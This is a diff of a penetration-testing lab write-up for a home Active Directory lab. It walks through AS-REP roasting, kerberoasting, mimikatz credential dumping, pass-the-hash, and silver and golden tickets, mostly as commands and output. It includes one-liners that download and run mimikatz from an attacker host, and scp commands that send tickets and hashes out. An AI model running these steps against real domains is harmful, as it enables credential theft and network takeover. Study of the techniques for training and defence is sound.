@@ -4,15 +4,15 @@
 
 |Server|IP Address|OS|Function|
 |---|---|---|---|
-|kali.vx|192.168.17.10|Kali Linux 2022.1|Attacking Machine|
-|dc.lab.vx|192.168.17.141|Windows Server 2016|Domain Controller|
-|svr.lab.vx|192.168.17.151|Windows Server 2016|Domain Member Server, SQL Server|
-|client.lab.vx|192.168.17.161|Windows 10 1607|Domain Member Workstation, SQL Server Management Studio|
+|kali.vx|192.168.17.10|Kali Linux 2022.3|Attacking Machine|
+|dc.lab.vx|192.168.17.11|Windows Server 2022|Domain Controller|
+|svr.lab.vx|192.168.17.12|Windows Server 2022|Domain Member Server, SQL Server|
+|client.lab.vx|192.168.17.13|Windows 11|Domain Member Workstation, SQL Server Management Studio|
 
 ## Nmap Scan
 
 ```console
-┌──(kali㉿kali)-[~]
+┌──(root㉿kali)-[~]
 └─$ nmap -p- -sV -Pn 192.168.17.11-13
 Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-25 12:29 +08
 ```
@@ -90,7 +90,85 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 3 IP addresses (3 hosts up) scanned in 342.02 seconds
 ```
 
-# 1. Cached Credential Storage and Retrieval
+# 1. AS-REP Roasting
+
+AS-REP is a quick way to scan for entry into the domain when you do not know much about the domain yet
+
+## 1.1. The theory
+
+AS-REP Roasting is a technique that allows retrieving password hashes for users that have Kerberos preauthentication disabled
+
+![image](https://user-images.githubusercontent.com/90442032/206058102-6eb7dd07-d78e-4ab0-b83e-4c93f8a7ffb0.png)
+
+When preauthentication is **enabled**:
+- A user sends an Authentication Server Request (`AS-REQ`) message to the DC
+- The timestamp on that message is encrypted with the hash of the user’s password
+- If the DC can decrypt that timestamp using the user’s password hash on record, it sends back an Authentication Server Response (`AS-REP`) message that contains a session key and a Ticket Granting Ticket (`TGT`) issued by the Key Distribution Center (`KDC`), which is used for future access requests by the user
+
+If preauthentication is **disabled**:
+- A user can request authentication data for any user and the DC would return an `AS-REP` message
+- The session key part of the `AS-REP` message is encrypted using the user’s password hash, which can be used to brute-force the user’s password offline
+
+## 1.2. Use kerbrute to find users with preauthentication disabled
+
+```console
+┌──(root㉿kali)-[~]
+└─# kerbrute -users /usr/share/seclists/Usernames/Names/names.txt -domain lab.vx -dc-ip 192.168.17.11
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+[*] Valid user => cindy
+[*] Valid user => dave
+[*] Valid user => john
+[*] Valid user => luke [NOT PREAUTH]
+[*] Valid user => mike [NOT PREAUTH]
+[*] Valid user => paul
+[*] Valid user => ruth
+[*] Valid user => steve
+[*] Valid user => svr
+[*] No passwords were discovered :'(
+```
+
+## 1.3. Use GetNPUsers.py to get password hash
+
+```console
+┌──(root㉿kali)-[~]
+└─# python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py lab.vx/luke -no-pass -dc-ip 192.168.17.11
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+[*] Getting TGT for luke
+$krb5asrep$23$luke@LAB.VX:83a8d136c9ba393dd708c9aa7592627c$14923c61398475cc0472ed6f9d32058fd2cc40f303bbf4eb0fd7df2bffd0fd9dcb9471ed8dfa40e816f7dc6852b736a89c8ab0d1176f4d37b4c3359639df8d068f05305b51e7d0ed46902c5a7c038565d734a581600ac7619279f9f58c810766abf462b666f5e161f2e4f0a7d00dd4f35220f0e4c7803a291a02aec1f4206b066c6203d72d53b5d87a50d3ec446c9a03744f9662395fe402002859554873cfdccd06a55517072304a3939825068ac58be739c4732cae4efb95bd99fd29a21dfa15c53baff833f0003b56e48037404f6256413fed0c02623ba87b6c6a2d347129
+
+┌──(root㉿kali)-[~]
+└─# python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py lab.vx/mike -no-pass -dc-ip 192.168.17.11
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+[*] Getting TGT for mike
+$krb5asrep$23$mike@LAB.VX:16b0315eceaf3c550a69927d62456d9d$821259e1e9980ad1d2fe42f2278c09ebec3aa95cfb361df26ea424d544a79a0f01ee594a13f486086976f469671319da5b60fd334ce103c87d3ac57082820063bad67799e3670e8774594d7a7138caa8892e0cfaec067c19aaf8b32be13f92d302ba0f3b1875a4b030002e447579d3950a9843012c53687ce1342d1a2da0de3dad94b54f56bcfc7d3e07a09b91d81ca94d80690f9db7e0921c20d223f4b6db66ad94b3aa5a89b392fedd8e69428ea27359f80b7c00df0c8075f7fa1543c9f27956e5d5950e14b4405d7c5aeec255d3df1ecabdc05e5a0a892c00cb2e415e8cf7
+```
+
+## 1.4. User hashcat to crack the hashes
+
+```console
+┌──(root㉿kali)-[~]
+└─# time hashcat -m 18200 GetNPUsers.out /usr/share/wordlists/rockyou.txt
+hashcat (v6.2.6) starting
+⋮
+$krb5asrep$23$mike@LAB.VX:…:P@ssw0rd
+$krb5asrep$23$luke@LAB.VX:…:P@ssw0rd
+
+Session..........: hashcat
+Status...........: Cracked
+Hash.Mode........: 18200 (Kerberos 5, etype 23, AS-REP)
+⋮
+Started: Wed Dec  7 07:54:16 2022
+Stopped: Wed Dec  7 07:54:44 2022
+
+real    0m28.048s
+user    0m26.413s
+sys     0m0.398s
+```
+
+# 2. Cached Credential Storage and Retrieval
 
 **On Kali:** Prepare web server for `mimikatz` download
 
@@ -111,7 +189,7 @@ Option 1: PowerShell
 - Download: `(New-Object System.Net.WebClient).DownloadFile()`
 - Run: `Start-Process`
 
-```console
+```cmd
 set SRC_URL=http://kali.vx/mimikatz.exe
 set DST_PATH=%TEMP%\mimikatz.exe
 powershell.exe -NoProfile -ExecutionPolicy Bypass -Command (New-Object System.Net.WebClient).DownloadFile($env:SRC_URL,$env:DST_PATH); Start-Process $env:DST_PATH
@@ -119,7 +197,7 @@ powershell.exe -NoProfile -ExecutionPolicy Bypass -Command (New-Object System.Ne
 
 Option 2: certutil
 
-```console
+```cmd
 certutil.exe /urlcache /f /split http://kali.vx/mimikatz.exe %TEMP%\mimikatz.exe && %TEMP%\mimikatz.exe
 ```
 
@@ -137,7 +215,7 @@ certutil.exe /urlcache /f /split http://kali.vx/mimikatz.exe %TEMP%\mimikatz.exe
 
 - ☝️ **Note**: mimikatz needs to run from an elevated shell; running mimikatz from a non-elevated shell will not work:
 
-```console
+```cmd
 mimikatz # privilege::debug
 ERROR kuhl_m_privilege_simple ; RtlAdjustPrivilege (20) c0000061
 
@@ -159,9 +237,9 @@ mimikatz # sekurlsa::logonpasswords
 ERROR kuhl_m_sekurlsa_acquireLSA ; Handle on memory (0x00000005)
 ```
 
-## 1.1. Successful `lsadump::sam` example
+## 2.1. Successful `lsadump::sam` example
 
-```console
+```cmd
 mimikatz # lsadump::sam
 Domain : CLIENT
 SysKey : 732c3b24f5f9c476753d4d1bc72961d7
@@ -199,9 +277,9 @@ Supplemental Credentials:
 ⋮
 ```
 
-## 1.2. Successful `lsadump::lsa /patch` example
+## 2.2. Successful `lsadump::lsa /patch` example
 
-```console
+```cmd
 mimikatz # lsadump::lsa /patch
 Domain : CLIENT / S-1-5-21-1540030335-1244868743-683777651
 
@@ -231,9 +309,9 @@ LM   :
 NTLM : 5a2b1b78290d381def497905d467fcff
 ```
 
-## 1.3. Successful `sekurlsa::logonpasswords` example
+## 2.3. Successful `sekurlsa::logonpasswords` example
 
-```console
+```cmd
 mimikatz # sekurlsa::logonpasswords
 
 Authentication Id : 0 ; 7831562 (00000000:0077800a)
@@ -271,15 +349,15 @@ SID               : S-1-5-21-1470288461-3401294743-676794760-1104
 ••• OUTPUT TRUNCATED •••
 ```
 
-# 2. Pass the Hash
+# 3. Pass the Hash
 
 ☝️ **Note**: LM hashes are not used from Windows 10 onwards, a string of `32 zeros` can used to fill the LM hash portion of the pth-winexe command
 
-## 2.1. pth-winexe
+## 3.1. pth-winexe
 - Domain account
 
 ```console
-┌──(kali㉿kali)-[~]
+┌──(root㉿kali)-[~]
 └─$ pth-winexe -U LAB/domainadmin%00000000000000000000000000000000:e19ccf75ee54e06b06a5907af13cef42 //192.168.17.151 cmd
 E_md4hash wrapper called.
 HASH PASS: Substituting user supplied NTLM HASH...
@@ -298,7 +376,7 @@ SVR
 - Local account
 
 ```console
-┌──(kali㉿kali)-[~]
+┌──(root㉿kali)-[~]
 └─$ pth-winexe -U administrator%00000000000000000000000000000000:e19ccf75ee54e06b06a5907af13cef42 //192.168.17.151 cmd
 E_md4hash wrapper called.
 HASH PASS: Substituting user supplied NTLM HASH...
@@ -314,14 +392,14 @@ hostname
 SVR
 ```
 
-## 2.2. mimikatz - sekurlsa::pth
+## 3.2. mimikatz - sekurlsa::pth
 
-### 2.2.1. Domain account
+### 3.2.1. Domain account
 
 - On mimikatz: run `privilege::debug` followed by `sekurlsa::pth`
 - The `sekurlsa::pth` will spawn a new cmd window
 
-```console
+```cmd
 mimikatz # privilege::debug
 Privilege '20' OK
 
@@ -336,7 +414,7 @@ NTLM    : e19ccf75ee54e06b06a5907af13cef42
 
 - Connect to the target machine in the new cmd window
 
-```console
+```cmd
 C:\Windows\system32>whoami
 lab\mike
 
@@ -360,11 +438,11 @@ C:\Windows\system32>hostname
 DC
 ```
 
-### 2.2.2. Local account
+### 3.2.2. Local account
 
-- Using `sekurlsa::pth` for local accounts is similar as domain accounts; just user `*` or `workgroup` for the `/domain` option
+- Using `sekurlsa::pth` for local accounts is similar as domain accounts; just use `*` or `workgroup` for the `/domain` option
 
-```console
+```cmd
 mimikatz # privilege::debug
 Privilege '20' OK
 
@@ -380,7 +458,7 @@ NTLM    : e19ccf75ee54e06b06a5907af13cef42
 - Connect to the target machine in the new cmd window
 - ☝️ **Note**: `sekurlsa::pth` for local accounts must use the built-in `administrator` account, because only PsExec uses the `ADMIN$` to run the new cmd
 
-```console
+```cmd
 C:\Windows\system32>whoami
 lab\mike
 
@@ -404,11 +482,11 @@ C:\Windows\system32>hostname
 SVR
 ```
 
-# 3. Service Account Attack
+# 4. Service Account Attack
 
-## 3.1. Discover SPNs
+## 4.1. Discover SPNs
 
-```console
+```cmd
 C:\Users\mike>setspn -Q */*
 Checking domain DC=lab,DC=vx
 CN=krbtgt,CN=Users,DC=lab,DC=vx
@@ -426,20 +504,20 @@ CN=MSSQL Service Account,OU=OSCP Lab,DC=lab,DC=vx
 Existing SPN found!
 ```
 
-## 3.2. Kerberoasting
+## 4.2. Kerberoasting
 
-### 3.2.1. Option 1 - Extracting service account hash with mimikatz + kerberoast package
+### 4.2.1. Option 1 - Extracting service account hash with mimikatz + kerberoast package
 
 **On Target:** Request tickets from PowerShell
 
-```console
+```cmd
 Add-Type -AssemblyName System.IdentityModel
 New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList MSSQLSvc/SVR.lab.vx:1433
 ```
 
 **Sample Results:**
 
-```console
+```cmd
 PS C:\Users\mike> klist
 
 Current LogonId is 0:0xa48995
@@ -486,7 +564,7 @@ mimikatz # kerberos::list /export
 
 **On Target:** Upload the ticket to Kali
 
-```console
+```cmd
 scp <ticket> kali@kali.vx:/home/kali/
 ```
 
@@ -503,12 +581,12 @@ sudo apt -y install kerberoast
 **On Kali:** Extract service account hash from the ticket exported by mimikatz
 
 ```console
-┌──(kali㉿kali)-[~]
+┌──(root㉿kali)-[~]
 └─$ python3 /usr/share/kerberoast/kirbi2john.py 1-40a10000-mike@MSSQLSvc~SVR.lab.vx~1433-LAB.VX.kirbi > tgs.hash
 tickets written: 1
 ```
 
-### 3.2.2. Option 2 - Extracting service account hash directly with Invoke-Kerberoast script from powershell-empire
+### 4.2.2. Option 2 - Extracting service account hash directly with Invoke-Kerberoast script from powershell-empire
 
 #### Dump password hash
 
@@ -524,23 +602,23 @@ sudo python3 -m http.server 80 &> /dev/null &
 - Download: `(New-Object System.Net.WebClient).DownloadFile()`
 - Run: `Invoke-Kerberoast`
 
-```console
+```cmd
 powershell.exe -NoProfile -ExecutionPolicy Bypass "Invoke-Expression (New-Object System.Net.WebClient).DownloadString('http://kali.vx/Invoke-Kerberoast.ps1'); Invoke-Kerberoast -OutputFormat hashcat | % { $_.Hash } | Out-File -Encoding ASCII tgs.hash"
 ```
 
 **On Target:** Upload the hash to Kali
 
-```console
+```cmd
 scp tgs.hash kali@kali.vx:/home/kali/
 ```
 
-## 3.3. Cracking service account hash using hashcat
+## 4.3. Cracking service account hash using hashcat
 
 #### Unpack existing `rockyou.txt` (❗14 million records❗)
 
 ```console
-┌──(kali㉿kali)-[~]
-└─$ sudo gzip -d /usr/share/wordlists/rockyou.txt.gz
+┌──(root㉿kali)-[~]
+└─$ gzip -d /usr/share/wordlists/rockyou.txt.gz
 ```
 
 #### Use the hashcat to crack the service ticket
@@ -554,64 +632,16 @@ It doesn't matter that `rockyou.txt` has 14 million records, the time taken by h
 #### Crack the hash
 
 ```console
-┌──(kali㉿kali)-[~]
+┌──(root㉿kali)-[~]
 └─$ time hashcat -m 13100 tgs.hash /usr/share/wordlists/rockyou.txt
 hashcat (v6.2.6) starting
-
-OpenCL API (OpenCL 3.0 PoCL 3.0+debian  Linux, None+Asserts, RELOC, LLVM 13.0.1, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
-============================================================================================================================================
-* Device #1: pthread-Intel(R) Core(TM) i7-8700 CPU @ 3.20GHz, 1440/2945 MB (512 MB allocatable), 8MCU
-
-Minimum password length supported by kernel: 0
-Maximum password length supported by kernel: 256
-
-Hashes: 1 digests; 1 unique digests, 1 unique salts
-Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
-Rules: 1
-
-Optimizers applied:
-* Zero-Byte
-* Not-Iterated
-* Single-Hash
-* Single-Salt
-
-ATTENTION! Pure (unoptimized) backend kernels selected.
-Pure kernels can crack longer passwords, but drastically reduce performance.
-If you want to switch to optimized kernels, append -O to your commandline.
-See the above message to find out about the exact limits.
-
-Watchdog: Hardware monitoring interface not found on your system.
-Watchdog: Temperature abort trigger disabled.
-
-Host memory required for this attack: 1 MB
-
-Dictionary cache built:
-* Filename..: /usr/share/wordlists/rockyou.txt
-* Passwords.: 14344392
-* Bytes.....: 139921507
-* Keyspace..: 14344385
-* Runtime...: 1 sec
-
-$krb5tgs$23$*MSSQLSVC$lab.vx$MSSQLSvc/SVR.lab.vx:1433*$a9063376d22e2b32ff90578c2b2cfd8a$81e91299cab444a834e8f09917f5ca8242928fa95629b50e6ec7f165042f684033f9a1fdf5fde0980a7d82bd36dbc4d1f4bd964a0a2b5f389e9cb6e09ac42d012487ba2c084ed1c2f6d1c89356a255e6c76311705ab1410b94eec153c5e869a889f1c8a762a368497851722e722b140ae064f6eeafc8421f83311d0b60772a376f8fc269d4dfb94f7944853e82c0b916faf07d31447e83a4e4d188dd3b977e04cdfdb013b44b806b78836196fb386bbf1aba899f383982d3fc15d423561f7f3b78c046c295ccb858b85510418b7e144b2e3e490f6f83411a7ee437a865dc664df947b1a36255bcf6b0b4876b5be739527af1d3d42df9871e5d3a2542d8bf760c0325721b9ec4fec08edce9991c80d6d6772b9d1b02f2317e993de47be4ff834e06ef42e7796465160680363d654885e032bae19eb7805077bf88f6c2785f27c158fb15cd45dda66fc1a24847cb665d72d40a1f2ebd82d3dddd94ad834340cb32792721758dfae5c5604965010ca182758a1a4b6e609507cac4e41bd1f048fd4fff30365a26ebfb53df7702e9a11d31195e2b2f1fbf677d8e30aaea27551251a1ce4de358787eb79a0fd257cf54388b1acac3b8e02f84592d588278a68b453cf1ff093d14613dcba150d54ef04505d906314e5f61226d1549c7fa48f8193b27fd1367252bfe3ef9309b28ee255c4bb2f0928b10a740125b90d6516cc6a7840b678823a13f709886852f68d1d30adf1b90d2f03718a767eeec31a155f9ccc7bfcfb7e53fac664eeb618fabd645b1e2e981194d34ca577e12f71e531316a07676a40ebc68811e34fce68253736edaf1b7a4368e941ddfc59d8857114534eda478166901339dc6f22488968e0366c7bad729fd419e539107a5915bd477016360f6c2ff6510ba1830ad40c030a4846a315e7e78df2f5898172569f598c2b23e924a4d7d1f6830302082ad302dff6909c72c880caabe497f0cc559a1b9adc16fd5f9144b43bb0c816c83959817624e5f7e743bada7b4161481c9ed6a617f34b06e2deabbd430a7aa332608ac9730f84e425d352a59422080eb2110bce586c1d9cbb6f25a7c0c11dc68a791ce3dfc2660618c3478da3ddc76516d7a471f1a65d23bf9296e41c308d73a121b392b155a648eb0d273a6d4f12fcdc5ffbe895d871e04f4cb51f231d0632f06e004f358fcdbb19ae7a3242090388c28b742337eb87dd2aa7bf70fcab6141740df549917e9d898a85dc4c243811e8fe1d9080e6e3e3be452f053d666e3e1d4fa882c9b4f603a0749efe6fb9cdd5604a6eb9d7656d6d1abe791fad334aa5de88e6bb9123bcd524a2784a37ce73a4c7c03764513453622a968f2e7cfb7eac110883910584c454c6430661f251dd7583472fa1479330628dc633f8b4000e366048efd276e23f973d8cfa83d3f70f390f372c1c0013060b0da119c5e8115a429081e76c9a6866680aa0f76fb8956fd26d3f86f261e387a90fc4c830e54a755b84480f6a8dae6571cbbf1c98880a7a409cf3a4482caa452a87895a43f280bacc497e7df2649bf8c790f4b86a28f76a2e2b10457dcb5920d9217656394ff20a87d90798a3a8743d47d6baff22bfe5b826987d579fef8851098d62b3da90ca3998eff6c82706881af4e0fb0b15867638b4454cf35ef705e53f53f3ba6b5c86c7774b5:P@ssw0rd
+⋮
+$krb5tgs$23$*MSSQLSVC$lab.vx$MSSQLSvc/SVR.lab.vx:1433*…:P@ssw0rd
 
 Session..........: hashcat
 Status...........: Cracked
 Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
-Hash.Target......: $krb5tgs$23$*MSSQLSVC$lab.vx$MSSQLSvc/SVR.lab.vx:14...7774b5
-Time.Started.....: Wed Oct 26 20:52:12 2022 (0 secs)
-Time.Estimated...: Wed Oct 26 20:52:12 2022 (0 secs)
-Kernel.Feature...: Pure Kernel
-Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
-Guess.Queue......: 1/1 (100.00%)
-Speed.#1.........:   152.8 kH/s (0.64ms) @ Accel:256 Loops:1 Thr:1 Vec:8
-Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
-Progress.........: 8192/14344385 (0.06%)
-Rejected.........: 0/8192 (0.00%)
-Restore.Point....: 6144/14344385 (0.04%)
-Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
-Candidate.Engine.: Device Generator
-Candidates.#1....: horoscope -> whitetiger
-
+⋮
 Started: Wed Oct 26 20:51:46 2022
 Stopped: Wed Oct 26 20:52:13 2022
 
@@ -620,7 +650,7 @@ user    0m25.597s
 sys     0m0.333s
 ```
 
-## 3.4. Cracking .kirbi ticket using tgsrepcrack.py (not recommended)
+## 4.4. Cracking .kirbi ticket using tgsrepcrack.py (not recommended)
 
 - It is possible to crack the .kirbi ticket exported from mimikatz directing using the `tgsrepcrack.py` script, but it is extremely slow compared to hashcat
 - Time taken for `tgsrepcrack.py`:
@@ -636,7 +666,7 @@ sys     0m0.333s
 #### Crack the ticket
 
 ```console
-┌──(kali㉿kali)-[~]
+┌──(root㉿kali)-[~]
 └─$ time python3 /usr/share/kerberoast/tgsrepcrack.py rockyou.100k 1-40a10000-mike@MSSQLSvc~SVR.lab.vx~1433-LAB.VX.kirbi
 
 
@@ -652,8 +682,9 @@ user    0m47.828s
 sys     0m0.016s
 ```
 
-## 3.5. Silver Ticket
-### 3.5.1. Retrieve domain's numeric identifier
+## 4.5. Silver Ticket
+
+### 4.5.1. Retrieve domain's numeric identifier
 
 Security Identifier or SID format: `S-R-I-S`
 - `S` - A literal `S` to identify the string as a SID
@@ -663,7 +694,7 @@ Security Identifier or SID format: `S-R-I-S`
   - Domain's numeric identifier, e.g. `21-1470288461-3401294743-676794760`
   - Relative identifier or RID representing the specific object in the domain, e.g. `1105`
 
-```console
+```cmd
 C:\Users\mike>whoami /user
 
 USER INFORMATION
@@ -674,8 +705,9 @@ User Name SID
 lab\mike  S-1-5-21-1470288461-3401294743-676794760-1105
 ```
 
-### 3.5.2. Generate hash value for service account password
-```console
+### 4.5.2. Generate hash value for service account password
+
+```cmd
 mimikatz # kerberos::hash /password:P@ssw0rd
         * rc4_hmac_nt       e19ccf75ee54e06b06a5907af13cef42
         * aes128_hmac       f67365e0a00838aff75e6ca33f3c2be2
@@ -683,17 +715,19 @@ mimikatz # kerberos::hash /password:P@ssw0rd
         * des_cbc_md5       76fdfece25e3da54
 ```
 
-### 3.5.3. Purge existing kerberos tickkets
+### 4.5.3. Purge existing kerberos tickets
+
 - ☝️ **Note**: it is important to run `kerberos::purge` even if `klist` show zero cached tickets
-```console
+```cmd
 mimikatz # kerberos::purge
 Ticket(s) purge for current session is OK
 ```
 
-### 3.5.4. Generate KRB_TGS ticket
+### 4.5.4. Generate KRB_TGS ticket
+
 - ☝️ **Note**: The service identifies the user using the SID, the user name can be anything like `nonexistentuser`
 
-```console
+```cmd
 mimikatz # kerberos::golden /user:nonexistentuser /domain:LAB.VX /sid:S-1-5-21-1470288461-3401294743-676794760 /id:1105 /target:svr.lab.vx:1433 /service:MSSQLSvc /rc4:e19ccf75ee54e06b06a5907af13cef42 /ptt
 User      : nonexistentuser
 Domain    : LAB.VX (LAB)
@@ -715,8 +749,9 @@ Lifetime  : 18/4/2022 9:15:16 am ; 15/4/2032 9:15:16 am ; 15/4/2032 9:15:16 am
 Golden ticket for 'nonexistentuser @ LAB.VX' successfully submitted for current session
 ```
 
-### 3.5.5. Verify ticket
-```console
+### 4.5.5. Verify ticket
+
+```cmd
 C:\Users\dummy>klist
 
 Current LogonId is 0:0x3441a5
@@ -735,8 +770,9 @@ Cached Tickets: (1)
         Kdc Called:
 ```
 
-### 3.5.6. Attempt login to service
-```console
+### 4.5.6. Attempt login to service
+
+```cmd
 C:\Users\dummy>"C:\Program Files\Microsoft SQL Server\Client SDK\ODBC\170\Tools\Binn\SQLCMD.EXE" -S svr.lab.vx
 1> SELECT SYSTEM_USER;
 2> GO
@@ -747,13 +783,14 @@ LAB\nonexistentuser
 (1 rows affected)
 ```
 
-# 4. Golden Ticket
+# 5. Golden Ticket
 
-## 4.1. Dump password hashes on domain controller
+## 5.1. Dump password hashes on domain controller
+
 - Requires `Domain Admins` rights
 - Information of interest: domain SID and `krbtgt` password hash
 
-```console
+```cmd
 mimikatz # privilege::debug
 Privilege '20' OK
 
@@ -770,12 +807,13 @@ NTLM : 3ac4cccaca955597db0d11a7ffa50025
 ⋮
 ```
 
-## 4.2. Create golden ticket using information retrieved from domain controller
+## 5.2. Create golden ticket using information retrieved from domain controller
+
 - This can be performed on any domain member machine, without administrator rights
 - ☝️ **Note**: it is important to run `kerberos::purge` even if `klist` show zero cached tickets
 - The `misc::cmd` command opens a command prompt session with the golden ticket injected to that session
 
-```console
+```cmd
 mimikatz # kerberos::purge
 Ticket(s) purge for current session is OK
 
@@ -801,10 +839,11 @@ mimikatz # misc::cmd
 Patch OK for 'cmd.exe' from 'DisableCMD' to 'KiwiAndCMD' @ 00007FF6FF396438
 ```
 
-## 4.3. Use the golden ticket to laterally move to **any** domain machine
+## 5.3. Use the golden ticket to laterally move to **any** domain machine
+
 - Verify golden ticket in session
 
-```console
+```cmd
 C:\Users\john>hostname
 CLIENT
 
@@ -816,7 +855,7 @@ Windows IP Configuration
 Ethernet adapter Ethernet:
 
    Connection-specific DNS Suffix  . :
-   IPv4 Address. . . . . . . . . . . : 192.168.17.161
+   IPv4 Address. . . . . . . . . . . : 192.168.17.13
    Subnet Mask . . . . . . . . . . . : 255.255.255.0
    Default Gateway . . . . . . . . . : 192.168.17.1
 
@@ -840,7 +879,7 @@ Cached Tickets: (1)
 
 - Attempt to connect to domain member machine
 
-```console
+```cmd
 C:\Users\john>PsExec.exe \\SVR.lab.vx cmd.exe
 
 PsExec v2.34 - Execute processes remotely
@@ -865,7 +904,7 @@ Windows IP Configuration
 Ethernet adapter Ethernet:
 
    Connection-specific DNS Suffix  . :
-   IPv4 Address. . . . . . . . . . . : 192.168.17.151
+   IPv4 Address. . . . . . . . . . . : 192.168.17.12
    Subnet Mask . . . . . . . . . . . : 255.255.255.0
    Default Gateway . . . . . . . . . : 192.168.17.1
 
